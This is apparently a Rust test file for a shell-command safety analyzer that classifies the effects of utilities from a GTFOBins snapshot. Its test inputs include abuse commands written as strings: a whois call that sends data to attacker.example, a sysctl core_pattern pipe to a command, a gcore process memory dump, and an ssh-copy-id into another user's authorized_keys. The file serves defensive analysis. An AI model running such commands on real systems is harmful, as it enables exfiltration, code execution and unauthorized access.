//! Static argv/effect checks for group A of the fixed GTFOBins snapshot.
//! Dangerous examples are represented as strings and never executed.
use caushell_parse::parse_command;
use caushell_profile::*;
use caushell_types::ShellKind;

const ARP: &str = include_str!("../profiles/arp.yaml");
const BRIDGE: &str = include_str!("../profiles/bridge.yaml");
const NFT: &str = include_str!("../profiles/nft.yaml");
const IPTABLES_SAVE: &str = include_str!("../profiles/iptables-save.yaml");
const CLAMSCAN: &str = include_str!("../profiles/clamscan.yaml");
const DMESG: &str = include_str!("../profiles/dmesg.yaml");
const GCORE: &str = include_str!("../profiles/gcore.yaml");
const SYSCTL: &str = include_str!("../profiles/sysctl.yaml");
const SSH_COPY_ID: &str = include_str!("../profiles/ssh-copy-id.yaml");
const WHOIS: &str = include_str!("../profiles/whois.yaml");

fn bind(source: &str, command: &str) -> BoundInvocation {
    let profile = load_command_profile_from_str(source).unwrap();
    let parsed = parse_command(command, ShellKind::Bash).unwrap();
    let projected = project_invocation(&parsed.commands[0], InvocationRuntimeContext::new());
    let selected = select_invocation(&profile, &projected)
        .unwrap_or_else(|error| panic!("{command}: {error}"));
    bind_invocation(&profile, &projected, &selected)
}

fn assert_form(source: &str, command: &str, form: &str) -> BoundInvocation {
    let bound = bind(source, command);
    assert_eq!(bound.form_id.as_str(), form, "{command}: {bound:#?}");
    assert!(bound.residuals.is_empty(), "{command}: {bound:#?}");
    assert!(
        !bound.operation_semantics_unresolved,
        "{command}: {bound:#?}"
    );
    bound
}

fn args(bound: &BoundInvocation, name: &str) -> Vec<String> {
    bound
        .bound_parameters
        .iter()
        .filter(|parameter| parameter.name.as_str() == name)
        .flat_map(|parameter| &parameter.values)
        .map(|value| match value {
            BoundValue::Argument { text, .. } => text.clone(),
            other => panic!("unexpected {name} value: {other:?}"),
        })
        .collect()
}

fn has_effect(bound: &BoundInvocation, expected: EffectKind) -> bool {
    bound.effects.iter().any(|effect| effect.kind == expected)
}

#[test]
fn every_profile_loads_with_source_and_boundary_records() {
    for (name, source) in [
        ("arp", ARP),
        ("bridge", BRIDGE),
        ("nft", NFT),
        ("iptables-save", IPTABLES_SAVE),
        ("clamscan", CLAMSCAN),
        ("dmesg", DMESG),
        ("gcore", GCORE),
        ("sysctl", SYSCTL),
        ("ssh-copy-id", SSH_COPY_ID),
        ("whois", WHOIS),
    ] {
        let profile =
            load_command_profile_from_str(source).unwrap_or_else(|error| panic!("{name}: {error}"));
        assert_eq!(profile.identity.canonical_name.as_str(), name);
        assert!(
            profile
                .extensions
                .contains_key("caushell.profile/source_research"),
            "{name}"
        );
        assert!(
            profile
                .extensions
                .contains_key("caushell.profile/known_limitations"),
            "{name}"
        );
    }
}

#[test]
fn native_file_inputs_and_local_output_bind_to_their_actual_roles() {
    let arp = assert_form(
        ARP,
        "arp -v -f /opt/shared/arp.entries",
        "load_entries_from_file",
    );
    assert_eq!(args(&arp, "entry_file"), ["/opt/shared/arp.entries"]);
    assert!(has_effect(&arp, EffectKind::ReadPath));

    let bridge = assert_form(
        BRIDGE,
        "bridge -b /opt/shared/bridge.batch",
        "execute_batch_file",
    );
    assert_eq!(args(&bridge, "batch_paths"), ["/opt/shared/bridge.batch"]);
    assert!(has_effect(&bridge, EffectKind::ReadPath));
    assert!(has_effect(&bridge, EffectKind::ExecutePayload));

    let nft = assert_form(NFT, "nft -f /opt/shared/rules.nft", "execute_ruleset_file");
    assert_eq!(args(&nft, "ruleset_paths"), ["/opt/shared/rules.nft"]);
    assert!(has_effect(&nft, EffectKind::ReadPath));
    assert!(has_effect(&nft, EffectKind::ExecutePayload));

    let save = assert_form(
        IPTABLES_SAVE,
        "iptables-save -f /tmp/project/rules.v4",
        "save_rules_to_file",
    );
    assert_eq!(args(&save, "output_paths"), ["/tmp/project/rules.v4"]);
    assert!(has_effect(&save, EffectKind::WritePath));

    let clamscan = assert_form(
        CLAMSCAN,
        "clamscan --no-summary -d /opt/shared/x.yara -f /opt/shared/paths",
        "scan_file_list",
    );
    assert_eq!(args(&clamscan, "file_lists"), ["/opt/shared/paths"]);
    assert_eq!(args(&clamscan, "database_paths"), ["/opt/shared/x.yara"]);
    assert!(has_effect(&clamscan, EffectKind::ReadPath));

    let dmesg = assert_form(DMESG, "dmesg -rF /opt/shared/messages", "read_syslog_file");
    assert_eq!(args(&dmesg, "input_file"), ["/opt/shared/messages"]);
    assert!(has_effect(&dmesg, EffectKind::ReadPath));
}

#[test]
fn process_kernel_and_remote_destinations_keep_unknown_and_remote_boundaries() {
    let core = assert_form(GCORE, "gcore $PID", "dump_process_memory");
    assert_eq!(args(&core, "process_ids"), ["$PID"]);
    assert!(has_effect(&core, EffectKind::ControlProcess));
    assert!(has_effect(&core, EffectKind::WritePath));

    let sysctl_set = assert_form(
        SYSCTL,
        "sysctl 'kernel.core_pattern=|/path/to/command'",
        "set_kernel_parameter",
    );
    assert!(has_effect(&sysctl_set, EffectKind::WritePath));
    assert!(!has_effect(&sysctl_set, EffectKind::ExecutePayload));
    let sysctl_read = assert_form(
        SYSCTL,
        "sysctl -n '/../../path/to/input-file'",
        "read_or_list_kernel_parameters",
    );
    assert!(has_effect(&sysctl_read, EffectKind::ReadPath));
    let ordinary_sysctl_read = assert_form(
        SYSCTL,
        "sysctl -n kernel.ostype",
        "read_or_list_kernel_parameters",
    );
    assert!(has_effect(&ordinary_sysctl_read, EffectKind::ReadPath));

    let ssh = assert_form(
        SSH_COPY_ID,
        "ssh-copy-id -f -i /opt/shared/key.pub -t /home/bob/.ssh/authorized_keys bob@host.example",
        "copy_public_key_to_remote",
    );
    assert_eq!(args(&ssh, "identity_files"), ["/opt/shared/key.pub"]);
    assert_eq!(args(&ssh, "remote_host"), ["bob@host.example"]);
    assert_eq!(
        args(&ssh, "remote_target_path"),
        ["/home/bob/.ssh/authorized_keys"]
    );
    assert!(has_effect(&ssh, EffectKind::ReadPath));
    assert!(has_effect(&ssh, EffectKind::NetworkEndpoint));
    assert!(has_effect(&ssh, EffectKind::WritePath));
    let ssh_preview = assert_form(
        SSH_COPY_ID,
        "ssh-copy-id -n -i /opt/shared/key.pub bob@host.example",
        "preview_remote_copy",
    );
    assert!(has_effect(&ssh_preview, EffectKind::NetworkEndpoint));
    assert!(!has_effect(&ssh_preview, EffectKind::WritePath));

    let whois = assert_form(
        WHOIS,
        "whois -h attacker.example -p 12345 DATA",
        "query_whois_server",
    );
    assert_eq!(args(&whois, "query_text"), ["DATA"]);
    assert_eq!(args(&whois, "server"), ["attacker.example"]);
    assert_eq!(args(&whois, "server_port"), ["12345"]);
    assert!(has_effect(&whois, EffectKind::NetworkEndpoint));
    assert!(has_effect(&whois, EffectKind::TransformData));
}

#[test]
fn no_file_read_form_is_selected_for_normal_or_help_invocations() {
    assert_form(ARP, "arp -n", "display_or_manage_cache");
    assert_form(BRIDGE, "bridge link show", "direct_bridge_operation");
    assert_form(NFT, "nft list ruleset", "direct_ruleset_operation");
    assert_form(IPTABLES_SAVE, "iptables-save -t filter", "print_rules");
    assert_form(CLAMSCAN, "clamscan --help", "show_help");
    assert_form(DMESG, "dmesg -H", "read_kernel_buffer_with_pager");
    assert_form(DMESG, "dmesg -H -P", "read_kernel_buffer");
    assert_form(SYSCTL, "sysctl -a", "list_kernel_parameters");
    assert_form(WHOIS, "whois --help", "show_help");
}
